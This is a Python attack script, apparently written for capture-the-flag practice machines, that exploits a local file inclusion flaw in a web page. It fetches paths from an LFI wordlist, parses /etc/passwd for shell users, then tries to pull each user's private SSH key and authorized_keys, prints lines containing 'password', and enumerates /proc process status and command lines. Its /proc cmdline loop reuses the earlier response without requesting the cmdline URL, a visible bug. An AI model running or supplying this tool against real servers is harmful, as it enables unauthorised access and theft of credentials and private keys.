import argparse
import re
import requests

parser = argparse.ArgumentParser(description='Exploit LFI vulnerability to extract data from a URL.')
parser.add_argument('url', type=str, help='URL of the vulnerable page')
parser.add_argument('--cookie', '-C', action='store', help='Add a cookie to the request')
args = parser.parse_args()

# when doing a box and getting an LFI
# enumerate machine
# find users
# elucidate web root
# fuzz for non traditional files and configs 
# bagel,retired,ServMon(Windows),agile,tabby


print(f'Exploiting LFI on URL: {args.url}')

#file_paths = ['/etc/passwd', '/etc/shadow', '/etc/hosts', '/etc/group', '/etc/profile', '/etc/bashrc','/etc/os-release']

file_paths=[]
with open('/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt','r') as f:
    for line in f:
        file_paths.append(line.strip())

with open('/home/kali/Tools/LFI_Analysis/tomcat9_file','r') as f:
    for line in f:
        file_paths.append(line.strip())

file_paths.append('/proc/sched_debug')

# First check
Users = []
Keys_Found = []
for path in file_paths:
    cookies = {}
    if args.cookie:
        cookies['cookie'] = args.cookie
    response = requests.get(args.url+path,cookies=cookies)
    try:
        if response.status_code == 200 and 'File not found' not in response.content.decode() and len(response.content.decode())>0:
            # do something with the response content
            if '/etc/passwd' in path:
                for line in response.content.decode().split('\n'):
                    match = re.match(r'(\w+):.*:/bin/bash', line)
                    if match:
                        Users.append(match.group(1))
                if len(Users)>0:
                    print('Users found!  '+ str(Users))
                    print('Searching for SSH keys')
                    for user in Users:
                      response1 = requests.get(args.url+'/home/'+user+'/.ssh/id_rsa')
                      response2 = requests.get(args.url+'/home/'+user+'/.ssh/authorized_keys')
                      if response1.status_code == 200 and 'File not found' not in response1.content.decode() and 'Login' not in response1.content.decode():
                          print(response1.content.decode())
                      else:
                          print('NOT FOUND /home/'+user+'/.ssh/id_rsa')
                      if response2.status_code == 200 and 'File not found' not in response2.content.decode() and 'Login' not in response2.content.decode():
                          print(response2.content.decode())
                      else:
                          print('NOT FOUND /home/'+user+'/.ssh/authorized_keys')
                          

            else:
                print(path)
                response_lines = response.content.decode().split('\n')
                for line in response_lines:
                    if 'password' in line:
                        print(line)
                
        else:
            #print(f'Error: HTTP response code {response.status_code} for {args.url+path}')
            pass
    except:
        pass
        

    
    
print('proc time')
FFP = []
# Loop through process IDs and check if they exist
for i in range(0,1000):
    url = args.url+'/proc/'+str(i)+'/status'
    response = requests.get(url)
    
    if response.status_code == 200 and 'File not found' not in response.content.decode() and 'Login' not in response.content.decode() and response.content.decode()!= '':
        print(f'Process {i} exists')
        print(response.content.decode().splitlines()[0])
        # do something with the response content
        pass
    else:
        #print(f'Process {i} does not exist')
        pass


    url = args.url+'/proc/'+str(i)+'/cmdline'
    
    #print(response.content.decode())
    
    if response.status_code == 200 and  response.content.decode() != '' and response.content.decode() != 'File not found' and 'Login' not in response.content.decode():
        output_parts = response.content.decode().splitlines()[0].split("\x00")
        print(f'cmdline {i} exists')
        print(response.content.decode()[0])
        for part in output_parts:
        # Check if the part looks like a file path
            if part and ("/" in part or "\\" in part):
                FFP.append(part)
        # do something with the response content
    else:
        #print(f'Process {i} does not exist')
        pass
print(set(FFP))










